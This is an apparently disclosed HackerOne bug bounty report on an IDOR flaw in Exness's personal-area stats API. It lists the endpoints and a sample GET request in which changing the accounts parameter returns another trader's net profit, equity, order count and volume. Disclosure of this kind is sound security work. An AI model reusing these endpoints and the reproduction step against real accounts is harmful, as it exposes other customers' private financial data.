# IDOR in Stats API Endpoint Allows Viewing Equity or Net Profit of Any MT Account 

## Report Details
- **Report ID**: 1644436
- **URL**: https://hackerone.com/reports/1644436
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-07-21T06:09:49.368Z
- **Disclosed**: 2022-12-05T15:50:08.032Z

## Reporter
- **Username**: ashwarya
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: exness

## Vulnerability Information
Hi Team,

Today I logged into my Exness PA and noticed an updated performance [page](https://my.exness.com/pa/performance/summary). I thought to give it a quick check and noticed that the API endpoints responsible for fetching the stats performance chart (```*/stats/*```) is vulnerable to IDOR via `accounts=` parameter. The issue allows fetching the stats of any MT account and discloses the account equity / net profit  of the corresponding account.

#Vulnerable Endpoints
```
https://my.exness.com/v3/personal_area/stats/net_profit?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/trading_volume?time_range=365&accounts={accountNumber}
https://my.exness.com/v3/personal_area/stats/equity?time_range=365&accounts={accountNumber}
```

#Steps to Reproduce
```
GET /v3/personal_area/stats/equity?time_range=365&accounts=xxx HTTP/2
Host: my.exness.com
Authorization: Bearer xyz
Content-Type: application/json
```


#Proof of Concept

███████

## Impact

IDOR allows stats of any MT trading account. The stats includes account net profit, closed order counts, trading volumes and daily equity figures.

## Attachments
No attachments
